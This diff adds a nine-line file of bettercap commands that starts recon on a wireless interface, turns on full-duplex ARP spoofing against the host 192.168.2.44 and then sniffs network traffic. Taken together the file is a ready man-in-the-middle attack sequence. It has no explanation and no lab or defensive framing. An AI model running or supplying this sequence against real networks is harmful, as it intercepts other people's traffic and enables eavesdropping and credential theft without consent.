@@ -1,0 +1,9 @@
+bettercap -iface wlan0
+help
+net.probe on
+net.recon on
+arp.spoof.fullduplex true
+set arp.spoof.targets 192.168.2.44             
+arp.spoof on
+net.sniff on
+
